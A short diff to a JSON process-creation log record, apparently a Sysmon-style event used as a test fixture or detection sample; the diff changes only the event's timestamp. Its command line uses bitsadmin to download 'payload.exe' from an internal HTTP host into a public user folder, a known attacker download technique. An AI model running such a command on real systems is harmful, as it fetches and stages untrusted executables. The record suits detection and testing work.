@@ -1,6 +1,6 @@
 {
   "EventID": 1,
-  "UtcTime": "2026-06-17T14:22:15.332Z",
+  "UtcTime": "2026-06-13T14:22:15.332Z",
   "Hostname": "WKSTN-042",
   "Image": "C:\\Windows\\System32\\bitsadmin.exe",
   "CommandLine": "bitsadmin /transfer debjob /download /priority foreground http://10.10.30.10:8888/file/download C:\\Users\\Public\\payload.exe",
